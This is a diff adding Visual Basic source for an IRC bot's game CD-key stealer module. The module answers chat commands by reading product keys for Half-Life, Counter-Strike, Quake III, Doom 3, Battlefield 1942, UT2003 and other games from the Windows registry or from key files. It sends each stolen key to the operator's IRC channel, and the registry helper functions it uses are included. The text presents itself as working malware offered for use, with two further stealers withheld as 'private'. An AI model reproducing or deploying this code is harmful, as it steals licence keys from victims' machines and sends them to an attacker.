@@ -1,0 +1,147 @@
+GetStringValue Function is at the bottom of this source.
+
+'Half-Life Key Stealer!
+        ElseIf Mid$(msg, 1, 3) = "!hl" Then
+            HLKey = GetStringValue("HKEY_CURRENT_USER\Software\Valve\Half-Life\Settings", "Key")
+            If HLKey = "Error" Then
+            Else
+                Bot.SendData "privmsg " & BotChan & " :[Half-Life Key] " & HLKey & vbCrLf
+            End If
+'Counter-Strike Key Stealer!
+        ElseIf Mid$(msg, 1, 3) = "!cs" Then
+            CSKey = GetStringValue("HKEY_CURRENT_USER\Software\Valve\CounterStrike\Settings", "Key")
+            If CSKey = "Error" Then
+            Else
+                Bot.SendData "privmsg " & BotChan & " :[Counter-Strike Key] " & CSKey & vbCrLf
+            End If
+'Quake III Key Stealer!
+        ElseIf Mid$(msg, 1, 3) = "!q3" Then
+        On Error Resume Next
+        Q3Dir = GetStringValue("HKEY_LOCAL_MACHINE\Software\id\Quake III Arena", "InstallPath")
+        If Q3Dir = "Error" Then
+            Close #6
+        Else
+            Open Q3Dir & "\base\q3key" For Input As #6
+            Line Input #6, Q3Key
+            Close #6
+            Bot.SendData "privmsg " & BotChan & " :[Quake III Arena Key] " & Q3Key & vbCrLf
+        End If
+'Doom III Key Stealer!
+        ElseIf Mid$(msg, 1, 6) = "!doom3" Then
+        On Error Resume Next
+        D3dir = GetStringValue("HKEY_LOCAL_MACHINE\Software\id\Doom 3", "InstallPath")
+        D3dir = Left(D3dir, InStr(D3dir, Chr(0)) - 1)
+        If D3dir = "Error" Then
+        Close #6
+        Else
+            Open D3dir & "\base\doomkey" For Input As #4
+            Line Input #4, D3Key
+            Close #4
+            Bot.SendData "privmsg " & BotChan & " :[Doom III Key] " & D3Key & vbCrLf
+        End If
+'Battlefield 1942 Key
+        ElseIf Mid$(msg, 1, 7) = "!bf1942" Then
+            BF1942 = GetStringValue("HKEY_LOCAL_MACHINE\Software\Electronic Arts\EA GAMES\Battlefield 1942", "ergc")
+            If BF1942 = "Error" Then
+            Else
+                Bot.SendData "privmsg " & BotChan & " :[Battlefield 1942 Key] " & BF1942 & vbCrLf
+            End If
+'Battlefield 1942 Road to Rome Key Stealer!
+        ElseIf Mid$(msg, 1, 6) = "!bfrtr" Then
+            BFRTR = GetStringValue("HKEY_LOCAL_MACHINE\Software\Electronic Arts\EA GAMES\Battlefield 1942 The Road to Rome", "ergc")
+            If BFRTR = "Error" Then
+            Else
+                Bot.SendData "privmsg " & BotChan & " :[Battlefield 1942 Road to Rome Key] " & BFRTR & vbCrLf
+            End If
+'Unreal Tournament 2003 Key Stealer
+        ElseIf Mid$(msg, 1, 6) = "!ut2k3" Then
+            UT2K3 = GetStringValue("HKEY_LOCAL_MACHINE\Software\Unreal Technology\Installed Apps\UT2003", "CDKey")
+            If UT2K3 = "Error" Then
+            Else
+                Bot.SendData "privmsg " & BotChan & " :[Unreal Tournament 2003 Key] " & UT2K3 & vbCrLf
+            End If
+'Project IGI 2 Key Stealer
+        ElseIf Mid$(msg, 1, 5) = "!igi2" Then
+            IGI2 = GetStringValue("HKEY_LOCAL_MACHINE\IGI 2 Retail", "CDKey")
+            If IGI2 = "Error" Then
+            Else
+                Bot.SendData "privmsg " & BotChan & " :[Project IGI 2 Key] " & IGI2 & vbCrLf
+            End If
+'Rainbow Six III Ravenshield
+        ElseIf Mid$(msg, 1, 4) = "!rb6" Then
+            RB6 = GetStringValue("HKEY_LOCAL_MACHINE\Software\Red Storm Entertainment\RAVENSHIELD", "CDKey")
+            If RB6 = "Error" Then
+            Else
+                Bot.SendData "privmsg " & BotChan & " :[Rainbow Six III Ravenshield Key] " & RB6 & vbCrLf
+            End If
+'Never Winter Nights + Mods Key Stealer!
+ElseIf Mid$(msg, 1, 4) = "!nwn" Then
+
+*********************
+***Private for now***
+*********************
+
+'Diablo II + LOD Key Stealer Mother facker!
+    ElseIf Mid$(msg, 1, 3) = "!d2" Then
+
+**************************    
+***Also Private for Now***
+**************************
+
+'Ver Command
+    ElseIf Mid$(msg, 1, 4) = "!ver" Then
+        Bot.SendData "privmsg " & BotChan & " :[Bot Version] edited" & vbCrLf
+        
+*********************************
+***The GetStringValue Function***
+*********************************
+        
+Function GetStringValue(SubKey As String, Entry As String)
+
+Call ParseKey(SubKey, MainKeyHandle)
+
+If MainKeyHandle Then
+   rtn = RegOpenKeyEx(MainKeyHandle, SubKey, 0, KEY_READ, hKey) 'open the key
+   If rtn = ERROR_SUCCESS Then 'if the key could be opened then
+      sBuffer = Space(255)     'make a buffer
+      lBufferSize = Len(sBuffer)
+      rtn = RegQueryValueEx(hKey, Entry, 0, REG_SZ, sBuffer, lBufferSize) 'get the value from the registry
+      If rtn = ERROR_SUCCESS Then 'if the value could be retreived then
+         rtn = RegCloseKey(hKey)  'close the key
+         sBuffer = Trim(sBuffer)
+         GetStringValue = Left(sBuffer, Len(sBuffer) - 1) 'return the value to the user
+      Else                        'otherwise, if the value couldnt be retreived
+         GetStringValue = "Error" 'return Error to the user
+         If DisplayErrorMsg = True Then 'if the user wants errors displayed then
+            'MsgBox ErrorMsg(rtn)  'tell the user what was wrong
+         End If
+      End If
+   Else 'otherwise, if the key couldnt be opened
+      GetStringValue = "Error"       'return Error to the user
+      If DisplayErrorMsg = True Then 'if the user wants errors displayed then
+         'MsgBox ErrorMsg(rtn)        'tell the user what was wrong
+      End If
+   End If
+End If
+End Function
+
+*************************************************
+***The ParseKey Function req by GetStringValue***
+*************************************************
+
+Private Sub ParseKey(Keyname As String, Keyhandle As Long)
+    
+rtn = InStr(Keyname, "\") 'return if "\" is contained in the Keyname
+
+If Left(Keyname, 5) <> "HKEY_" Or Right(Keyname, 1) = "\" Then 'if the is a "\" at the end of the Keyname then
+   'MsgBox "Incorrect Format:" + Chr(10) + Chr(10) + Keyname 'display error to the user
+   Exit Sub 'exit the procedure
+ElseIf rtn = 0 Then 'if the Keyname contains no "\"
+   Keyhandle = GetMainKeyHandle(Keyname)
+   Keyname = "" 'leave Keyname blank
+Else 'otherwise, Keyname contains "\"
+   Keyhandle = GetMainKeyHandle(Left(Keyname, rtn - 1)) 'seperate the Keyname
+   Keyname = Right(Keyname, Len(Keyname) - rtn)
+End If
+
+End Sub
